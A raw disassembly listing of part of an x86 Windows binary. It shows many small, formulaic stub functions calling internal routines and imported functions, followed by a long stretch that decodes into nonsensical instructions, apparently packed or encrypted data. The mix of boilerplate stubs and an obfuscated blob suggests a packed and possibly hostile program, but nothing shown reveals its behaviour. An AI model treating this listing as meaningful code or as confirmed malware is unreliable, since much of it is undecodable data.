  402380:	add    esp,0x4
  402383:	ret    
  402384:	mov    edi,edi
  402386:	push   ebp
  402387:	mov    ebp,esp
  402389:	sub    esp,0x34
  40238c:	push   eax
  40238d:	push   DWORD PTR [eax+0x1f4]
  402393:	push   DWORD PTR [eax+0x2e0]
  402399:	call   0x401410
  40239e:	add    esp,0x8
  4023a1:	pop    eax
  4023a2:	push   eax
  4023a3:	push   0x0
  4023a5:	mov    eax,ds:0x40401c
  4023aa:	call   eax
  4023ac:	pop    eax
  4023ad:	push   eax
  4023ae:	mov    eax,0x0
  4023b3:	push   eax
  4023b4:	mov    eax,ds:0x40401c
  4023b9:	call   eax
  4023bb:	pop    eax
  4023bc:	sub    esp,0xffffffcc
  4023bf:	mov    ebp,DWORD PTR [esp]
  4023c2:	add    esp,0x4
  4023c5:	ret    
	...
  402466:	add    BYTE PTR [eax],al
  402468:	mov    edi,edi
  40246a:	push   ebp
  40246b:	mov    ebp,esp
  40246d:	sub    esp,0x58
  402470:	push   eax
  402471:	push   ebx
  402472:	push   DWORD PTR [eax+0x120]
  402478:	push   edi
  402479:	call   0x4015f0
  40247e:	add    esp,0xc
  402481:	pop    eax
  402482:	push   eax
  402483:	mov    ecx,0x0
  402488:	push   ecx
  402489:	mov    eax,ds:0x404080
  40248e:	call   eax
  402490:	pop    eax
  402491:	push   eax
  402492:	mov    ebx,0x0
  402497:	push   ebx
  402498:	mov    eax,ds:0x404080
  40249d:	call   eax
  40249f:	pop    eax
  4024a0:	sub    esp,0xffffffa8
  4024a3:	mov    ebp,DWORD PTR [esp]
  4024a6:	add    esp,0x4
  4024a9:	ret    
	...
  40254a:	add    BYTE PTR [eax],al
  40254c:	mov    edi,edi
  40254e:	push   ebp
  40254f:	mov    ebp,esp
  402551:	sub    esp,0x30
  402554:	push   eax
  402555:	push   esi
  402556:	push   DWORD PTR [eax+0x148]
  40255c:	push   ebx
  40255d:	push   DWORD PTR [eax+0xfc]
  402563:	call   0x4020e4
  402568:	add    esp,0x10
  40256b:	pop    eax
  40256c:	push   eax
  40256d:	lea    eax,[eax-0x100]
  402573:	push   eax
  402574:	mov    eax,ds:0x404008
  402579:	call   eax
  40257b:	test   eax,eax
  40257d:	jne    0x40256d
  40257f:	pop    eax
  402580:	push   eax
  402581:	push   0x0
  402583:	mov    eax,ds:0x404054
  402588:	call   eax
  40258a:	pop    eax
  40258b:	sub    esp,0xffffffd0
  40258e:	mov    ebp,DWORD PTR [esp]
  402591:	add    esp,0x4
  402594:	ret    
  402595:	add    BYTE PTR [eax],al
  402597:	add    BYTE PTR [ebx-0x1374aa01],cl
  40259d:	sub    esp,0x2c
  4025a0:	push   eax
  4025a1:	lea    eax,[eax-0x100]
  4025a7:	push   eax
  4025a8:	mov    eax,ds:0x404008
  4025ad:	call   eax
  4025af:	test   eax,eax
  4025b1:	jne    0x4025a1
  4025b3:	pop    eax
  4025b4:	push   eax
  4025b5:	push   ebx
  4025b6:	push   DWORD PTR [eax+0x1f4]
  4025bc:	push   ecx
  4025bd:	push   DWORD PTR [eax+0x220]
  4025c3:	call   0x401218
  4025c8:	add    esp,0x10
  4025cb:	pop    eax
  4025cc:	push   eax
  4025cd:	push   0x0
  4025cf:	mov    eax,ds:0x40400c
  4025d4:	call   eax
  4025d6:	pop    eax
  4025d7:	sub    esp,0xffffffd4
  4025da:	mov    ebp,DWORD PTR [esp]
  4025dd:	add    esp,0x4
  4025e0:	ret    
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4025e9:	sub    esp,0x4c
  4025ec:	push   eax
  4025ed:	push   0x0
  4025ef:	mov    eax,ds:0x404080
  4025f4:	call   eax
  4025f6:	pop    eax
  4025f7:	push   eax
  4025f8:	push   DWORD PTR [eax+0x2c0]
  4025fe:	push   edx
  4025ff:	push   esi
  402600:	push   edi
  402601:	call   0x401f48
  402606:	add    esp,0x10
  402609:	pop    eax
  40260a:	push   eax
  40260b:	push   0x0
  40260d:	mov    eax,ds:0x404074
  402612:	call   eax
  402614:	pop    eax
  402615:	sub    esp,0xffffffb4
  402618:	mov    ebp,DWORD PTR [esp]
  40261b:	add    esp,0x4
  40261e:	ret    
  40261f:	add    BYTE PTR [ebx-0x1374aa01],cl
  402625:	sub    esp,0x20
  402628:	push   eax
  402629:	push   DWORD PTR [eax+0x36c]
  40262f:	push   ecx
  402630:	push   DWORD PTR [eax+0x3d4]
  402636:	call   0x401fdc
  40263b:	add    esp,0xc
  40263e:	pop    eax
  40263f:	push   eax
  402640:	mov    ecx,0x0
  402645:	push   ecx
  402646:	mov    eax,ds:0x404004
  40264b:	call   eax
  40264d:	pop    eax
  40264e:	push   eax
  40264f:	push   0x0
  402651:	mov    eax,ds:0x40400c
  402656:	call   eax
  402658:	pop    eax
  402659:	sub    esp,0xffffffe0
  40265c:	mov    ebp,DWORD PTR [esp]
  40265f:	add    esp,0x4
  402662:	ret    
	...
  4026b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4026b9:	sub    esp,0x44
  4026bc:	push   eax
  4026bd:	push   0x0
  4026bf:	mov    eax,ds:0x404014
  4026c4:	call   eax
  4026c6:	pop    eax
  4026c7:	push   eax
  4026c8:	push   DWORD PTR [eax+0x1cc]
  4026ce:	push   DWORD PTR [eax+0xd8]
  4026d4:	call   0x4013c4
  4026d9:	add    esp,0x8
  4026dc:	pop    eax
  4026dd:	push   eax
  4026de:	mov    eax,ds:0x404030
  4026e3:	call   eax
  4026e5:	pop    eax
  4026e6:	sub    esp,0xffffffbc
  4026e9:	mov    ebp,DWORD PTR [esp]
  4026ec:	add    esp,0x4
  4026ef:	ret    
	...
  402740:	mov    edi,edi
  402742:	push   ebp
  402743:	mov    ebp,esp
  402745:	sub    esp,0x3c
  402748:	push   eax
  402749:	lea    eax,[eax-0x100]
  40274f:	push   eax
  402750:	mov    eax,ds:0x404008
  402755:	call   eax
  402757:	test   eax,eax
  402759:	jne    0x402749
  40275b:	pop    eax
  40275c:	push   eax
  40275d:	push   DWORD PTR [eax+0x1b4]
  402763:	push   ecx
  402764:	push   ecx
  402765:	push   DWORD PTR [eax+0x290]
  40276b:	call   0x4028e0
  402770:	add    esp,0x10
  402773:	pop    eax
  402774:	push   eax
  402775:	push   0x0
  402777:	mov    eax,ds:0x40401c
  40277c:	call   eax
  40277e:	pop    eax
  40277f:	sub    esp,0xffffffc4
  402782:	mov    ebp,DWORD PTR [esp]
  402785:	add    esp,0x4
  402788:	ret    
  402789:	add    BYTE PTR [eax],al
  40278b:	add    BYTE PTR [ebx-0x1374aa01],cl
  402791:	sub    esp,0x60
  402794:	push   eax
  402795:	push   esi
  402796:	push   DWORD PTR [eax+0x38]
  402799:	push   ecx
  40279a:	push   DWORD PTR [eax+0x150]
  4027a0:	call   0x4025e4
  4027a5:	add    esp,0x10
  4027a8:	pop    eax
  4027a9:	push   eax
  4027aa:	mov    edi,0x0
  4027af:	push   edi
  4027b0:	mov    eax,ds:0x404004
  4027b5:	call   eax
  4027b7:	pop    eax
  4027b8:	push   eax
  4027b9:	mov    ebx,0x0
  4027be:	push   ebx
  4027bf:	mov    eax,ds:0x404014
  4027c4:	call   eax
  4027c6:	pop    eax
  4027c7:	sub    esp,0xffffffa0
  4027ca:	mov    ebp,DWORD PTR [esp]
  4027cd:	add    esp,0x4
  4027d0:	ret    
	...
  402821:	add    BYTE PTR [eax],al
  402823:	add    BYTE PTR [ebx-0x1374aa01],cl
  402829:	sub    esp,0x44
  40282c:	push   eax
  40282d:	push   0x0
  40282f:	mov    eax,ds:0x404014
  402834:	call   eax
  402836:	pop    eax
  402837:	push   eax
  402838:	push   DWORD PTR [eax+0x2e8]
  40283e:	push   edx
  40283f:	call   0x401c84
  402844:	add    esp,0x8
  402847:	pop    eax
  402848:	push   eax
  402849:	mov    esi,0x0
  40284e:	push   esi
  40284f:	mov    eax,ds:0x40401c
  402854:	call   eax
  402856:	pop    eax
  402857:	sub    esp,0xffffffbc
  40285a:	mov    ebp,DWORD PTR [esp]
  40285d:	add    esp,0x4
  402860:	ret    
  402861:	add    BYTE PTR [eax],al
  402863:	add    BYTE PTR [ebx-0x1374aa01],cl
  402869:	sub    esp,0x24
  40286c:	push   eax
  40286d:	push   edx
  40286e:	push   edx
  40286f:	push   esi
  402870:	push   ebx
  402871:	call   0x4019dc
  402876:	add    esp,0x10
  402879:	pop    eax
  40287a:	push   eax
  40287b:	mov    eax,0x0
  402880:	push   eax
  402881:	mov    eax,ds:0x404020
  402886:	call   eax
  402888:	pop    eax
  402889:	push   eax
  40288a:	push   0x0
  40288c:	mov    eax,ds:0x404080
  402891:	call   eax
  402893:	pop    eax
  402894:	sub    esp,0xffffffdc
  402897:	mov    ebp,DWORD PTR [esp]
  40289a:	add    esp,0x4
  40289d:	ret    
  40289e:	add    BYTE PTR [eax],al
  4028a0:	mov    edi,edi
  4028a2:	push   ebp
  4028a3:	mov    ebp,esp
  4028a5:	sub    esp,0x5c
  4028a8:	push   eax
  4028a9:	mov    eax,0x0
  4028ae:	push   eax
  4028af:	mov    eax,ds:0x40402c
  4028b4:	call   eax
  4028b6:	pop    eax
  4028b7:	push   eax
  4028b8:	push   ecx
  4028b9:	push   DWORD PTR [eax+0x238]
  4028bf:	call   0x401bc0
  4028c4:	add    esp,0x8
  4028c7:	pop    eax
  4028c8:	push   eax
  4028c9:	push   0x0
  4028cb:	mov    eax,ds:0x40402c
  4028d0:	call   eax
  4028d2:	pop    eax
  4028d3:	sub    esp,0xffffffa4
  4028d6:	mov    ebp,DWORD PTR [esp]
  4028d9:	add    esp,0x4
  4028dc:	ret    
  4028dd:	add    BYTE PTR [eax],al
  4028df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4028e5:	sub    esp,0x5c
  4028e8:	push   eax
  4028e9:	mov    eax,ds:0x404030
  4028ee:	call   eax
  4028f0:	pop    eax
  4028f1:	push   eax
  4028f2:	push   edi
  4028f3:	push   ecx
  4028f4:	push   ebx
  4028f5:	push   DWORD PTR [eax+0x364]
  4028fb:	call   0x401a48
  402900:	add    esp,0x10
  402903:	pop    eax
  402904:	push   eax
  402905:	mov    edi,0x0
  40290a:	push   edi
  40290b:	mov    eax,ds:0x404004
  402910:	call   eax
  402912:	pop    eax
  402913:	sub    esp,0xffffffa4
  402916:	mov    ebp,DWORD PTR [esp]
  402919:	add    esp,0x4
  40291c:	ret    
	...
  40296d:	add    BYTE PTR [eax],al
  40296f:	add    bh,al
  402971:	jl     0x40294f
  402973:	jno    0x4029f3
  402975:	mov    esi,0xbc5daae5
  40297a:	bound  edi,QWORD PTR [eax]
  40297c:	mov    eax,0x9cc377a9
  402981:	ret    
  402982:	out    0x1c,eax
  402984:	out    dx,al
  402985:	in     al,0xf6
  402987:	xchg   BYTE PTR [ebx],al
  402989:	cld    
  40298a:	mov    esp,DWORD PTR [ebx+0x3f7b8bf]
  402990:	inc    eax
  402991:	ror    DWORD PTR [edx+0x6e590eaa],1
  402997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402998:	hlt    
  402999:	test   DWORD PTR [ebp-0x72bb8135],edi
  40299f:	(bad)  [ecx]
  4029a1:	and    eax,0x22d98c0b
  4029a6:	dec    esi
  4029a7:	sub    eax,0xd55b8576
  4029ac:	(bad)  
  4029ad:	and    esi,eax
  4029af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b0:	xor    ebx,esp
  4029b2:	jbe    0x4029d1
  4029b4:	or     bh,BYTE PTR [ebx+0x67287ea3]
  4029ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bb:	push   edi
  4029bc:	dec    ebp
  4029bd:	mov    cs,WORD PTR [esi+0x26]
  4029c0:	jbe    0x402947
  4029c2:	pop    ebx
  4029c3:	push   esp
  4029c4:	mov    bl,0x6b
  4029c6:	dec    ebp
  4029c7:	dec    esi
  4029c8:	sbb    dh,BYTE PTR [esi+0x16edfa69]
  4029ce:	retf   0x2e2b
  4029d1:	aad    0xd8
  4029d3:	aam    0x42
  4029d5:	push   eax
  4029d6:	lds    ebp,FWORD PTR [esi+0xcd65389]
  4029dc:	mov    bh,BYTE PTR [ecx]
  4029de:	call   0x8d54:0x5bd50eaa
  4029e5:	jp     0x4029b7
  4029e7:	add    BYTE PTR [esi-0x762ba389],bl
  4029ed:	daa    
  4029ee:	sub    ebx,esi
  4029f0:	iret   
  4029f1:	xchg   ebp,eax
  4029f2:	pop    ebx
  4029f3:	aam    0x89
  4029f5:	xlat   BYTE PTR ds:[ebx]
  4029f6:	dec    esi
  4029f7:	fnstenv [ebp+eax*4+0x5b]
  4029fb:	pop    ebp
  4029fc:	iret   
  4029fd:	xchg   BYTE PTR [esi+ebx*8+0x1c],al
  402a01:	out    0x33,al
  402a03:	xchg   ebp,eax
  402a04:	in     eax,0x16
  402a06:	xlat   BYTE PTR ds:[ebx]
  402a07:	inc    ebx
  402a08:	ds loopne 0x402a43
  402a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0c:	(bad)  [ecx]
  402a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a0f:	jge    0x402a8f
  402a11:	or     al,0x5d
  402a13:	mov    esi,0x59e01289
  402a18:	adc    esp,eax
  402a1a:	xor    ebx,DWORD PTR [esp+ebp*8+0x257fd61b]
  402a21:	jp     0x402a2f
  402a23:	fadd   QWORD PTR [eax]
  402a25:	cmp    al,0xa2
  402a27:	test   al,0xb2
  402a29:	popf   
  402a2a:	xor    DWORD PTR [ecx+eiz*8+0x762bb67a],edx
  402a31:	in     eax,dx
  402a32:	call   edx
  402a34:	mov    DWORD PTR [edx-0x34],edi
  402a37:	sub    ecx,DWORD PTR [ecx+0x715f4bd0]
  402a3d:	jg     0x402a46
  402a3f:	sub    esi,DWORD PTR [esi-0x7b]
  402a42:	or     ebx,DWORD PTR [ecx+0x3c]
  402a45:	stos   BYTE PTR es:[edi],al
  402a46:	pop    ebp
  402a47:	aam    0x89
  402a49:	cmp    al,0xff
  402a4b:	ror    BYTE PTR [ecx-0x4a70ac86],cl
  402a51:	ins    DWORD PTR es:[edi],dx
  402a52:	rcl    cl,1
  402a54:	mov    DWORD PTR [edx-0x7],edi
  402a57:	jne    0x402a4a
  402a59:	mov    cl,0x7f
  402a5b:	and    BYTE PTR [ecx-0x7d],0xa2
  402a5f:	sub    esi,DWORD PTR [esi+0x6d]
  402a62:	(bad)  
  402a64:	mov    DWORD PTR [edx+0x2b],edi
  402a67:	rcr    DWORD PTR [eax*4+0xf76d431],cl
  402a6e:	ret    0x897c
  402a71:	shl    BYTE PTR [ebx+0x5f],1
  402a74:	les    edx,FWORD PTR [edx]
  402a76:	int3   
  402a77:	sub    esp,DWORD PTR [edx]
  402a79:	fstp   QWORD PTR [edx-0x1f]
  402a7c:	lods   eax,DWORD PTR ds:[esi]
  402a7d:	sub    dh,ch
  402a7f:	jge    0x402aa2
  402a81:	jp     0x402a8f
  402a83:	clc    
  402a84:	shr    DWORD PTR ds:0x6d6e7da7,1
  402a8a:	jo     0x402a63
  402a8c:	mov    DWORD PTR [edx+0x2b],edi
  402a8f:	ins    DWORD PTR es:[edi],dx
  402a90:	dec    edx
  402a91:	or     BYTE PTR [edi-0x2e],bl
  402a94:	out    dx,eax
  402a95:	(bad)  
  402a96:	out    0x3d,al
  402a98:	jbe    0x402a3f
  402a9a:	sub    al,0xc2
  402a9c:	mov    al,0x22
  402a9e:	xchg   edx,eax
  402a9f:	pop    edi
  402aa0:	addr16 push cs
  402aa2:	add    esp,eax
  402aa4:	jecxz  0x402b24
  402aa6:	into   
  402aa7:	sub    eax,DWORD PTR [esi-0x7b]
  402aaa:	pop    ebx
  402aab:	sub    edi,ecx
  402aad:	sub    dh,bl
  402aaf:	aam    0x23
  402ab1:	xchg   ebp,eax
  402ab2:	(bad)  
  402ab3:	test   eax,0x41f22ae5
  402ab8:	jb     0x402a8c
  402aba:	push   cs
  402abb:	sub    ebx,esp
  402abd:	jbe    0x402ab1
  402abf:	inc    ecx
  402ac0:	je     0x402a94
  402ac2:	push   cs
  402ac3:	add    BYTE PTR [edx],0xb5
  402ac6:	sub    edx,eax
  402ac8:	test   DWORD PTR [ecx],esp
  402aca:	add    eax,0xfe76dc2b
  402acf:	mov    al,ds:0xe81086b8
  402ad4:	add    al,0x3
  402ad6:	mov    esi,0x4aa521a0
  402adb:	arpl   ax,cx
  402add:	outs   dx,BYTE PTR ds:[esi]
  402ade:	mov    ds:0x103279d3,eax
  402ae3:	shr    cl,cl
  402ae5:	icebp  
  402ae6:	out    dx,eax
  402ae7:	aas    
  402ae8:	repz inc ebp
  402aea:	das    
  402aeb:	xchg   ebp,eax
  402aec:	add    bh,BYTE PTR ds:0xf1b6aeae
  402af2:	popa   
  402af3:	cmp    al,0x18
  402af5:	jle    0x402a9d
  402af7:	sub    edi,ebp
  402af9:	dec    ebp
  402afa:	(bad)  
  402afb:	xchg   ebx,eax
  402afc:	lods   eax,DWORD PTR ds:[esi]
  402afd:	xchg   edx,eax
  402afe:	shr    DWORD PTR [ecx],1
  402b00:	jbe    0x402a87
  402b02:	pop    esi
  402b03:	mov    ds:0x3bdf859d,eax
  402b08:	std    
  402b09:	cli    
  402b0a:	push   edi
  402b0b:	xlat   BYTE PTR ds:[ebx]
  402b0c:	jb     0x402b2f
  402b0e:	mul    BYTE PTR [eax-0x7af4285e]
  402b14:	fisubr WORD PTR [ebx]
  402b16:	hlt    
  402b17:	inc    ecx
  402b18:	jb     0x402aee
  402b1a:	add    ch,BYTE PTR [ebx]
  402b1c:	fdiv   QWORD PTR [esi-0x3]
  402b1f:	sbb    BYTE PTR [esi-0x2981512e],dh
  402b25:	icebp  
  402b26:	imul   ebx,eax,0xffffffd2
  402b29:	jp     0x402b37
  402b2b:	fcom   st(1)
  402b2d:	sbb    esp,DWORD PTR [ebx]
  402b2f:	in     al,dx
  402b30:	pop    esi
  402b31:	addr16 call 0xa6bbad73
  402b37:	sub    ebx,DWORD PTR [esi-0x762ba4fc]
  402b3d:	and    cl,dh
  402b3f:	sub    esi,DWORD PTR [esi]
  402b41:	test   DWORD PTR [ebx+0x2b],ebx
  402b44:	cld    
  402b45:	adc    dh,al
  402b47:	mov    al,ds:0x3cab0e8d
  402b4c:	cmp    DWORD PTR [esi-0x5a],0x2b
  402b50:	adc    bh,BYTE PTR [edx+0x6c]
  402b53:	in     al,0x89
  402b55:	jp     0x402afd
  402b57:	jae    0x402b56
  402b59:	lds    edx,FWORD PTR [edi+0x5f]
  402b5c:	leave  
  402b5d:	jbe    0x402afc
  402b5f:	jae    0x402bcf
  402b61:	icebp  
  402b62:	pop    edi
  402b63:	pop    edi
  402b64:	mov    DWORD PTR [ecx-0x5e855fa1],edx
  402b6a:	pop    esi
  402b6b:	popf   
  402b6c:	mov    ch,0xf1
  402b6e:	aad    0x3
  402b70:	jne    0x402be4
  402b72:	shr    BYTE PTR [ecx+edx*4+0x1037d6f3],1
  402b79:	jb     0x402b93
  402b7b:	ret    0x5a89
  402b7e:	shl    DWORD PTR [edi],1
  402b80:	adc    ah,BYTE PTR [ebx+eax*2]
  402b83:	aam    0x89
  402b85:	jp     0x402bb2
  402b87:	imul   eax,DWORD PTR [esi+0xc],0x23
  402b8b:	fdiv   QWORD PTR [esi+0x2f]
  402b8e:	mov    dl,0xc3
  402b90:	add    BYTE PTR [edi-0x4c2b2ba5],al
  402b96:	(bad)  
  402b97:	mov    ds:0xb547a102,al
  402b9c:	fst    DWORD PTR [edx-0x7a89d067]
  402ba2:	add    edx,DWORD PTR [ebp-0xf]
  402ba5:	and    ah,BYTE PTR [esi+0x2c857629]
  402bab:	fild   DWORD PTR [edx]
  402bad:	jle    0x402b31
  402baf:	in     al,dx
  402bb0:	jb     0x402b53
  402bb2:	pop    ebx
  402bb3:	aam    0x89
  402bb5:	jp     0x402b5e
  402bb7:	pop    esi
  402bb8:	push   edx
  402bb9:	or     DWORD PTR [ebx],0xc6b949e7
  402bbf:	mov    al,ds:0xe82d8685
  402bc4:	add    cl,ah
  402bc6:	sub    esi,DWORD PTR es:[esi-0x7b]
  402bca:	fsub   QWORD PTR [edx]
  402bcc:	std    
  402bcd:	or     DWORD PTR [ebx+0x57fbfdd8],esp
  402bd3:	push   ecx
  402bd4:	jbe    0x402be4
  402bd6:	int3   
  402bd7:	sub    BYTE PTR [ebp-0x727da52e],cl
  402bdd:	jmp    DWORD PTR [esi+0x5e]
  402be0:	jb     0x402bb4
  402be2:	pop    edx
  402be3:	or     BYTE PTR [ecx+0xa0f02a],0x95
  402bea:	pop    esi
  402beb:	daa    
  402bec:	add    al,BYTE PTR [ecx+ecx*1-0x590f4952]
  402bf3:	(bad)  
  402bf4:	jle    0x402be7
  402bf6:	push   0xfd52775
  402bfb:	mov    esi,0xd4ff2b8d
  402c00:	and    ecx,DWORD PTR [ecx-0x70a0f3]
  402c06:	mov    bx,0xee6
  402c0a:	sbb    eax,0xa34e04c4
  402c0f:	jl     0x402bec
  402c11:	add    BYTE PTR [ebx-0x592c6d60],bl
  402c17:	sub    esi,DWORD PTR [esi+0x5]
  402c1a:	sub    al,0xd0
  402c1c:	add    al,0x3e
  402c1e:	mov    ds:0x5a7a5329,eax
  402c23:	aam    0x9
  402c25:	sub    ah,BYTE PTR [edi+0x5a91525e]
  402c2b:	add    BYTE PTR [ecx+0x29cb4bd1],0xdb
  402c32:	add    ecx,DWORD PTR [ebp+0x7cf52add]
  402c38:	mov    eax,edx
  402c3a:	push   edi
  402c3b:	mov    WORD PTR [edx],cs
  402c3d:	mov    esp,0xe4f9c0b2
  402c42:	sahf   
  402c43:	mov    ah,0x2
  402c45:	test   eax,0xf375d92b
  402c4a:	addr16 (bad) 
  402c4c:	fisttp WORD PTR [esi+0x21]
  402c4f:	stc    
  402c50:	jns    0x402c53
  402c52:	int3   
  402c53:	aam    0x89
  402c55:	jp     0x402c82
  402c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c58:	rol    BYTE PTR [ebp-0x33fd2ba5],cl
  402c5e:	push   es
  402c5f:	sub    esi,DWORD PTR [esi-0x7b]
  402c62:	fsub   QWORD PTR [edx]
  402c64:	xchg   dh,bh
  402c66:	and    eax,0x5e85762b
  402c6b:	daa    
  402c6c:	and    al,0xf1
  402c6e:	pop    esi
  402c6f:	sub    BYTE PTR [ebp-0x26ef292b],cl
  402c75:	sub    esi,esp
  402c77:	jnp    0x402c95
  402c79:	xor    DWORD PTR [ebx],0xa67a99d4
  402c7f:	jl     0x402c76
  402c81:	ins    DWORD PTR es:[edi],dx
  402c82:	pop    edi
  402c83:	test   bl,ah
  402c85:	jle    0x402c55
  402c87:	sub    esp,DWORD PTR [esi-0x7b]
  402c8a:	pop    ebx
  402c8b:	or     DWORD PTR [eax],0x7e
  402c8e:	sub    BYTE PTR [ebx],0x66
  402c91:	test   DWORD PTR [ebx+0x2b],ebx
  402c94:	fdiv   QWORD PTR [esi-0x59]
  402c97:	jge    0x402d13
  402c99:	fild   WORD PTR [eax]
  402c9b:	jns    0x402c3f
  402c9d:	mov    dl,0xf5
  402c9f:	mov    al,ds:0x57b054be
  402ca4:	pusha  
  402ca5:	jle    0x402c3a
  402ca7:	jmp    0x402cb9
  402ca9:	sub    BYTE PTR ds:0xd24a897d,bh
  402caf:	and    edx,DWORD PTR [ebx+0x7a]
  402cb2:	dec    edx
  402cb3:	aam    0x89
  402cb5:	jnp    0x402c69
  402cb7:	sub    al,0x94
  402cb9:	imul   eax,DWORD PTR [eax],0x59
  402cbc:	int    0x5e
  402cbe:	mov    ds:0x5ad5247a,al
  402cc3:	in     eax,0xe1
  402cc5:	jp     0x402c7d
  402cc7:	sub    esi,DWORD PTR [esi-0x2e]
  402cca:	fidivr WORD PTR [ecx*4+0x1e1aa72a]
  402cd1:	test   DWORD PTR [ebx-0x2c],ecx
  402cd4:	mov    DWORD PTR ds:0x85522f25,ebp
  402cda:	dec    ebx
  402cdb:	aam    0x89
  402cdd:	test   ecx,esi
  402cdf:	daa    
  402ce0:	mov    eax,edx
  402ce2:	push   edi
  402ce3:	mov    ss,eax
  402ce5:	and    bh,dh
  402ce7:	scas   al,BYTE PTR es:[edi]
  402ce8:	mov    edi,0x4ab5d8f0
  402ced:	sbb    cl,BYTE PTR [ebx+0x2c]
  402cf0:	(bad)  [edi-0x5c]
  402cf3:	pop    ecx
  402cf4:	mov    ebp,0x9ea06379
  402cf9:	push   cs
  402cfa:	scas   al,BYTE PTR es:[edi]
  402cfb:	ins    DWORD PTR es:[edi],dx
  402cfc:	cdq    
  402cfd:	jp     0x402ca5
  402cff:	sub    ebx,DWORD PTR [esi-0x762ba592]
  402d05:	rol    BYTE PTR [edi-0x4c7a89d5],0x35
  402d0c:	jbe    0x402c93
  402d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d0f:	jl     0x402ce0
  402d11:	sbb    BYTE PTR [ebx-0x2c],0x89
  402d15:	xchg   edx,eax
  402d16:	jo     0x402cec
  402d18:	mov    DWORD PTR [edx-0x2a],edi
  402d1b:	add    al,0x2
  402d1d:	dec    esi
  402d1e:	adc    BYTE PTR [edx-0x2ba47a81],0x61
  402d25:	mov    ebp,0x9762ba7
  402d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2b:	pop    edi
  402d2c:	inc    ebx
  402d2d:	xchg   edx,eax
  402d2e:	sbb    ah,dl
  402d30:	mov    DWORD PTR [edx+0x6e],edi
  402d33:	adc    al,0xd9
  402d35:	mov    ebx,0x81b72c6e
  402d3a:	jg     0x402d15
  402d3c:	mov    BYTE PTR [esi-0x7e],bh
  402d3f:	xchg   edx,esi
  402d41:	inc    ebp
  402d42:	sub    al,0x25
  402d44:	shl    ecx,1
  402d46:	pop    edi
  402d47:	adc    BYTE PTR [ebx-0x361a10f],dh
  402d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d4e:	sub    ebx,DWORD PTR [edi]
  402d50:	push   edx
  402d51:	cmp    al,0x51
  402d53:	aam    0x89
  402d55:	jp     0x402da5
  402d57:	mov    esi,0xc45a7a89
  402d5c:	ds jbe 0x402d4f
  402d5f:	jne    0x402d88
  402d61:	cmp    al,0x53
  402d63:	aam    0x89
  402d65:	jp     0x402db5
  402d67:	scas   al,BYTE PTR es:[edi]
  402d68:	mov    DWORD PTR [edx+0x5a],edi
  402d6b:	mov    fs,WORD PTR [ecx+0x5]
  402d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d6f:	sub    esi,DWORD PTR [esi+0xf]
  402d72:	das    
  402d73:	lock xchg ebp,eax
  402d75:	sbb    esp,DWORD PTR [ebx+0x7a]
  402d78:	mov    bh,0x6d
  402d7a:	inc    esp
  402d7b:	ins    DWORD PTR es:[edi],dx
  402d7c:	test   eax,0x3e2ba67a
  402d81:	icebp  
  402d82:	imul   ebp,DWORD PTR [ebp-0x75],0x7a
  402d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d87:	sub    edi,DWORD PTR [esi]
  402d89:	icebp  
  402d8a:	jae    0x402df9
  402d8c:	test   eax,0x3e2ba67a
  402d91:	icebp  
  402d92:	jnp    0x402e01
  402d94:	lea    edi,[edx-0x5a]
  402d97:	sub    edi,DWORD PTR [esi]
  402d99:	icebp  
  402d9a:	inc    ebx
  402d9b:	ins    DWORD PTR es:[edi],dx
  402d9c:	leave  
  402d9d:	jp     0x402d45
  402d9f:	sub    edi,DWORD PTR [esi]
  402da1:	icebp  
  402da2:	dec    ebx
  402da3:	ins    DWORD PTR es:[edi],dx
  402da4:	lea    edi,[edx-0x5a]
  402da7:	sub    edi,DWORD PTR [esi]
  402da9:	icebp  
  402daa:	push   ebx
  402dab:	ins    DWORD PTR es:[edi],dx
  402dac:	leave  
  402dad:	jp     0x402d55
  402daf:	sub    edi,DWORD PTR [esi]
  402db1:	icebp  
  402db2:	pop    ebx
  402db3:	pop    edi
  402db4:	dec    eax
  402db5:	and    esp,DWORD PTR [ebx+0x4b]
  402db8:	std    
  402db9:	shr    BYTE PTR [ebx],1
  402dbb:	push   ebp
  402dbc:	jnp    0x402da9
  402dbe:	dec    esp
  402dbf:	outs   dx,BYTE PTR ds:[esi]
  402dc0:	push   cs
  402dc1:	push   cs
  402dc2:	adc    al,0xbc
  402dc4:	add    al,BYTE PTR [ebx+eiz*1+0x2f852e56]
  402dcb:	xlat   BYTE PTR ds:[ebx]
  402dcc:	mov    BYTE PTR [edi],cl
  402dce:	(bad)  
  402dcf:	mov    al,ds:0x14dce533
  402dd4:	std    
  402dd5:	outs   dx,DWORD PTR ds:[esi]
  402dd6:	sub    eax,0xe1d74a6d
  402ddb:	ror    BYTE PTR [ecx-0x2c3c5986],1
  402de1:	test   BYTE PTR [ebx-0x2c],bl
  402de4:	sar    DWORD PTR [ecx+0x56],cl
  402de7:	sub    BYTE PTR [esi-0x3106c52],cl
  402ded:	and    dl,cl
  402def:	es jne 0x402de2
  402df2:	pop    es
  402df3:	xlat   BYTE PTR ds:[ebx]
  402df4:	hlt    
  402df5:	mov    esp,DWORD PTR es:[esi+0x2a]
  402df9:	add    BYTE PTR [eax-0x9287d60],dl
  402dff:	add    BYTE PTR [edi+ebx*8+0x796057f6],dh
  402e06:	inc    esp
  402e07:	enter  0x4617,0x3b
  402e0b:	push   edi
  402e0c:	hlt    
  402e0d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402e0f:	pop    edi
  402e10:	fs ins DWORD PTR es:[edi],dx
  402e12:	dec    edx
  402e13:	aam    0x89
  402e15:	jp     0x402e42
  402e17:	push   esi
  402e18:	and    al,BYTE PTR [eax]
  402e1a:	pop    edx
